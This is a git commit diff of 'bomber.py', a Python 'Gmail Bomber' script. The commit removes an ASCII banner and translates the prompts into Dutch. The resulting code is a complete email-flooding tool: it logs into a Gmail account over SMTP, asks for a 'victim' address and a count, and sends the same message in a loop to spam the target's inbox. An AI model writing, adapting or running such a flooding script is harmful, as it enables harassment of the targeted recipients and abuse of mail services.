7c256e809ef0f276a3210cef00309a243d86b30a
tomvisserr01 <59934711+tomvisserr01@users.noreply.github.com>
2020-01-15 20:56:00 +0100

    Update bomber.py

--- bomber.py
+++ bomber.py
@@ -1,53 +1,46 @@
 #Gmail Bomber by tomvisserr01
-#  _______ _                 _           __                 _                     _                 _ _
-# |__   __| |               | |         / _|               | |                   | |               | (_)            
-#    | |  | |__   __ _ _ __ | | _____  | |_ ___  _ __    __| | _____      ___ __ | | ___   __ _  __| |_ _ __   __ _ 
-#    | |  | '_ \ / _` | '_ \| |/ / __| |  _/ _ \| '__|  / _` |/ _ \ \ /\ / | '_ \| |/ _ \ / _` |/ _` | | '_ \ / _` |
-#    | |  | | | | (_| | | | |   <\__ \ | || (_) | |    | (_| | (_) \ V  V /| | | | | (_) | (_| | (_| | | | | | (_| |
-#    |_|  |_| |_|\__,_|_| |_|_|\_|___/ |_| \___/|_|     \__,_|\___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|_|_| |_|\__, |
-#                                                                                                              __/ |
-#                                                                                                             |___/ 
-print (''' Telegram \033[93m@ARNAB431\033[97m ''')
+
+print (''' \033[93m@tomvisserr\033[97m ''')
 import smtplib
 import platform
 import getpass
 import sys
 import datetime
 
-smtp   = raw_input("Enter Your Mail Server : ")
+smtp   = raw_input(" Mail Server : ")
 if smtp == 'gmail':
 		server = smtplib.SMTP('smtp.gmail.com',587)
 		server.starttls()
 
-		email     = raw_input("Enter Your Email : ")
-		password  = getpass.getpass("Enter your Password:")
+		email     = raw_input("Email : ")
+		password  = getpass.getpass(" Password:")
 
 		if not  email  and not password:
-				print ("You must Login to your Gmail")
+				print ("Login met je Gmail account")
 		else:
 				server.login(email,password)
-				print ("Successfully Signed in")
+				print ("Ingelogd")
 				
-				send = raw_input("Please Enter Your Victim Email : ")
+				send = raw_input("Email slachtoffer : ")
 
-				print("Enter number of times you want to flood")
+				print("Nummers hoevaak je wilt spammen")
 				thread= int(raw_input("Count : "))
 				
 
-				msg = raw_input("Enter Your Message :\n")
+				msg = raw_input("Voer je bericht in:\n")
 				
 				
 
 				for count in range(int(thread)):
 					server.sendmail(email,send,msg)
-					print (count,"SPAMMED ! ")
+					print (count,"DONE ! ")
 
 
 
 				server.quit()
 
 else:
-		print("You Must Choose 'gmail' ")				
+		print("Kies 'gmail' ")				
 
 
 #No comments. Simply waste.
